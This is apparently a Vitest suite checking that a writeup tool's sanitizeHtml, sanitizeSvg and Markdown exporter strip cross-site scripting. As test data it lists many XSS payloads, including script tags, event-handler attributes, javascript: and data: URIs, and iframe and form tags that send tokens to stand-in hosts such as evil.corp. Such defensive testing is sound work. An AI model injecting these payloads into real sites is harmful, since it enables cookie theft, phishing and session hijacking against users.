import { describe, it, expect } from 'vitest';
import { sanitizeHtml, sanitizeSvg } from '../../utils/securityUtils';
import { parseMarkdownToHtml, escapeHtml } from '../../utils/writeupHtmlExporter';

describe('Tier 4 E2E: Strict DOMPurify XSS Sanitization & Vector Neutralization Suite', () => {
  describe('HTML Sanitization (sanitizeHtml)', () => {
    it('XSS-01: Neutralizes classic script tag execution vectors', () => {
      const payloads = [
        '<script>alert(1)</script>',
        '<SCRIPT SRC="https://evil.corp/payload.js"></SCRIPT>',
        '<script/x>alert(document.cookie)</script>',
        '<<SCRIPT>alert("nested");//<</SCRIPT>',
        '<script type="text/javascript">window.location="http://evil.com"</script>',
      ];

      for (const payload of payloads) {
        const sanitized = sanitizeHtml(payload);
        expect(sanitized).not.toMatch(/<script/i);
        expect(sanitized).not.toMatch(/<\/script/i);
        expect(sanitized).not.toContain('alert(1)');
        expect(sanitized).not.toContain('evil.corp');
      }
    });

    it('XSS-02: Strips inline on* event handler vectors from img, body, and div tags', () => {
      const payloads = [
        '<img src="x" onerror="alert(1)" />',
        '<img src=x onerror=alert(document.domain)>',
        '<img src="valid.png" onload="alert(1)" onmouseover="alert(2)" />',
        '<div onmouseover="alert(1)">Hover me</div>',
        '<body onload="alert(1)">Content</body>',
        '<span onclick="alert(1)">Click</span>',
        '<details open ontoggle="alert(1)">Details</details>',
      ];

      for (const payload of payloads) {
        const sanitized = sanitizeHtml(payload);
        expect(sanitized).not.toMatch(/\son[a-z]+\s*=/i);
        expect(sanitized).not.toContain('alert(1)');
        expect(sanitized).not.toContain('alert(2)');
      }
    });

    it('XSS-03: Neutralizes javascript: and data: URI links and scheme injections', () => {
      const payloads = [
        '<a href="javascript:alert(1)">Click me</a>',
        '<a href="JAVASCRIPT:alert(document.cookie)">Click me</a>',
        '<a href="  javascript:alert(1)  ">Click me</a>',
        '<a href="javascript&colon;alert(1)">Encoded Colon</a>',
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data URI</a>',
        '<a href="vbscript:msgbox(1)">VBScript</a>',
      ];

      for (const payload of payloads) {
        const sanitized = sanitizeHtml(payload);
        expect(sanitized).not.toMatch(/href=["']?\s*javascript:/i);
        expect(sanitized).not.toMatch(/href=["']?\s*data:text\/html/i);
        expect(sanitized).not.toMatch(/href=["']?\s*vbscript:/i);
      }
    });

    it('XSS-04: Completely strips dangerous embedded resource tags (iframe, object, embed, form)', () => {
      const payloads = [
        '<iframe src="https://evil.corp/phishing.html"></iframe>',
        '<object data="https://evil.corp/payload.swf"></object>',
        '<embed src="https://evil.corp/exploit.pdf"></embed>',
        '<form action="https://evil.corp/steal" method="POST"><input name="token" value="secret"/></form>',
        '<link rel="stylesheet" href="http://evil.corp/evil.css">',
        '<meta http-equiv="refresh" content="0;url=http://evil.corp">',
        '<base href="http://evil.corp/">',
      ];

      for (const payload of payloads) {
        const sanitized = sanitizeHtml(payload);
        expect(sanitized).not.toMatch(/<(iframe|object|embed|form|link|meta|base)/i);
      }
    });

    it('XSS-05: Preserves safe semantic typography and table structures', () => {
      const safeHtml = `
        <h1>Adversary-Zero Assessment</h1>
        <p>Target was scanned using <code>nmap -sV 10.10.11.205</code>.</p>
        <p>Key findings include <strong>JWT token forging</strong> and <em>sudoers misconfiguration</em>.</p>
        <table>
          <thead><tr><th>Port</th><th>Service</th></tr></thead>
          <tbody><tr><td>22</td><td>OpenSSH</td></tr></tbody>
        </table>
        <ul><li>Item 1</li><li>Item 2</li></ul>
        <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1337" target="_blank" rel="noopener noreferrer">CVE-2024-1337</a>
      `;

      const sanitized = sanitizeHtml(safeHtml);
      expect(sanitized).toContain('<h1>Adversary-Zero Assessment</h1>');
      expect(sanitized).toContain('<code>nmap -sV 10.10.11.205</code>');
      expect(sanitized).toContain('<strong>JWT token forging</strong>');
      expect(sanitized).toContain('<em>sudoers misconfiguration</em>');
      expect(sanitized).toContain('<table>');
      expect(sanitized).toContain('<td>OpenSSH</td>');
      expect(sanitized).toContain('CVE-2024-1337');
    });

    it('XSS-06: Handles empty, null, and non-string inputs gracefully without exceptions', () => {
      expect(sanitizeHtml('')).toBe('');
      expect(sanitizeHtml(null as any)).toBe('');
      expect(sanitizeHtml(undefined as any)).toBe('');
      expect(sanitizeHtml(12345 as any)).toBe('');
    });
  });

  describe('SVG & Mermaid Vector Sanitization (sanitizeSvg)', () => {
    it('XSS-07: Strips scripts and event handlers embedded within SVG diagrams', () => {
      const maliciousSvgs = [
        '<svg><script>alert(1)</script></svg>',
        '<svg onload="alert(1)"><circle cx="10" cy="10" r="5"/></svg>',
        '<svg><circle cx="10" cy="10" r="5" onclick="alert(1)"/></svg>',
        '<svg><a xlink:href="javascript:alert(1)"><text>Click</text></a></svg>',
        '<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>',
        '<svg><set onbegin="alert(1)" attributeName="x" to="10"/></svg>',
        '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
      ];

      for (const svg of maliciousSvgs) {
        const sanitized = sanitizeSvg(svg);
        expect(sanitized).not.toMatch(/<script/i);
        expect(sanitized).not.toMatch(/\son[a-z]+\s*=/i);
        expect(sanitized).not.toMatch(/xlink:href=["']?\s*javascript:/i);
        expect(sanitized).not.toContain('alert(1)');
      }
    });

    it('XSS-08: Preserves legitimate tactical SVG graphics and graph elements', () => {
      const validSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100">
          <g fill="none" stroke="#10B981" stroke-width="2">
            <circle cx="50" cy="50" r="40" />
            <path d="M 30 50 L 50 70 L 70 30" dominant-baseline="central" />
          </g>
        </svg>
      `;

      const sanitized = sanitizeSvg(validSvg);
      expect(sanitized).toContain('<circle cx="50" cy="50" r="40"');
      expect(sanitized).toContain('dominant-baseline="central"');
      expect(sanitized).toContain('stroke="#10B981"');
    });

    it('XSS-09: Handles empty, null, and non-string SVG inputs safely', () => {
      expect(sanitizeSvg('')).toBe('');
      expect(sanitizeSvg(null as any)).toBe('');
      expect(sanitizeSvg(undefined as any)).toBe('');
    });
  });

  describe('Real JSDOM Container Ingestion & Execution Safety', () => {
    it('XSS-10: Ingesting sanitized payloads into DOM produces zero script nodes and zero active handlers', () => {
      const dirtyCombo = `
        <div id="target-recon">
          <h2>Recon Results</h2>
          <script>window.PwnedState = true;</script>
          <img src="nonexistent.png" onerror="window.PwnedState = true;" />
          <svg onload="window.PwnedState = true;"><circle r="10"/></svg>
          <a href="javascript:window.PwnedState = true;" id="exploit-link">Exploit</a>
        </div>
      `;

      (window as any).PwnedState = false;

      const cleanHtml = sanitizeHtml(dirtyCombo);

      const testContainer = document.createElement('div');
      testContainer.innerHTML = cleanHtml;
      document.body.appendChild(testContainer);

      // Verify DOM structure
      expect(testContainer.querySelectorAll('script').length).toBe(0);

      const allElements = testContainer.querySelectorAll('*');
      for (const el of allElements) {
        expect(el.getAttribute('onerror')).toBeNull();
        expect(el.getAttribute('onload')).toBeNull();
        expect(el.getAttribute('onclick')).toBeNull();
        const href = el.getAttribute('href');
        if (href) {
          expect(href.toLowerCase()).not.toContain('javascript:');
        }
      }

      // Assert that state was never corrupted
      expect((window as any).PwnedState).toBe(false);

      // Cleanup
      document.body.removeChild(testContainer);
    });
  });

  describe('Markdown Writeup Pipeline Integration', () => {
    it('XSS-11: Raw HTML in Markdown input is sanitized or escaped during writeup rendering', () => {
      const maliciousMarkdown = `
# Foothold Analysis
<script>alert('stored-xss')</script>
<img src=x onerror=alert('img-xss')>
[Malicious Link](javascript:alert('link-xss'))

\`\`\`bash
# Real command
nmap -p 80 10.10.10.1
\`\`\`
      `;

      const rendered = parseMarkdownToHtml(maliciousMarkdown);

      // Verify that script and onerror tags are either escaped (&lt;script&gt;) or stripped
      expect(rendered).not.toMatch(/<script>alert\('stored-xss'\)<\/script>/i);
      expect(rendered).not.toMatch(/<img[^>]+onerror=/i);
      expect(rendered).not.toMatch(/href=["']javascript:/i);

      // Valid code block preserved
      expect(rendered).toContain('nmap -p 80 10.10.10.1');
    });

    it('XSS-12: escapeHtml entity encoding covers all primary XSS metacharacters', () => {
      const metaChars = '& < > " \'';
      const escaped = escapeHtml(metaChars);

      expect(escaped).toContain('&amp;');
      expect(escaped).toContain('&lt;');
      expect(escaped).toContain('&gt;');
      expect(escaped).toContain('&quot;');
      expect(escaped).toContain('&#039;');
      expect(escaped).not.toContain('<');
      expect(escaped).not.toContain('>');
    });
  });
});
